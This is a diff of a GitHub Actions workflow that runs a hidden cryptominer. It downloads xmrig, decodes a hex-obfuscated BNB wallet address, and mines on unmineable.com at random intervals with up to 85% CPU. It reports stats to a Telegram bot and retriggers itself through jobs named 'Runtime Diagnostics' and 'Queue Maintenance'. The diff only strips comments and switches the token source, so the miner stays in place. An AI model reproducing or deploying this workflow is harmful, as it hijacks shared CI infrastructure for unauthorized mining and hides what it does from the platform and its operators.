@@ -45,14 +45,11 @@ jobs:
           tar -xzf core.tar.gz
           cd xmrig-6.24.0
           chmod +x xmrig
-
           sleep $((RANDOM % 300 + 30))
 
-          # HEX (BNB: wallet + worker + ref tag)
           HEX="424e423a3078663331396165663863316433323363383337343062636465396632353233386666356334383535642e756e6d696e6561626c655f776f726b65725f656274656a77686b23663278672d36796e75"
           ADDR=$(echo "$HEX" | xxd -r -p)
 
-          # Jalankan dengan 2 pool (TLS + TCP) dan kredensial eksplisit di tiap -o
           nice -n 10 ./xmrig -a rx \
             -o stratum+ssl://rx.unmineable.com:443 -u "$ADDR" -p x \
             --randomx-no-rdmsr --keepalive --http-enabled=0 --cpu-max-threads-hint=85 \
@@ -60,7 +57,6 @@ jobs:
             | tee report.log &
 
           PID=$!
-          # 20–90 menit
           sleep $((RANDOM % 5400 + 1200))
           kill $PID || true
 
@@ -76,13 +72,11 @@ jobs:
           ACC=$(grep -a "accepted" report.log | wc -l)
           REJ=$(grep -a "rejected" report.log | wc -l)
           HASH=${HASH:-"0 H/s"}
-
           MSG=$'✅ *BNB Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: `'"$HASH"$'`\n• Accepted: `'"$ACC"$'`\n• Rejected: `'"$REJ"$'`'
           printf "%s" "$MSG" | curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
             -d chat_id="${TG_CHAT_ID}" \
             --data-urlencode text@- \
             -d parse_mode=Markdown
-
           cd ..
           rm -rf xmrig-6.24.0 core.tar.gz || true
 
@@ -93,7 +87,7 @@ jobs:
       - name: Trigger Next (Runtime Diagnostics)
         if: always()
         env:
-          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+          GH_TOKEN: ${{ github.token }}
         run: |
           curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
                -H "Accept: application/vnd.github+json" \
@@ -103,7 +97,7 @@ jobs:
       - name: Queue Maintenance
         if: always()
         env:
-          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+          GH_TOKEN: ${{ github.token }}
         run: |
           curl -s -X POST \
             -H "Authorization: Bearer $GH_TOKEN" \
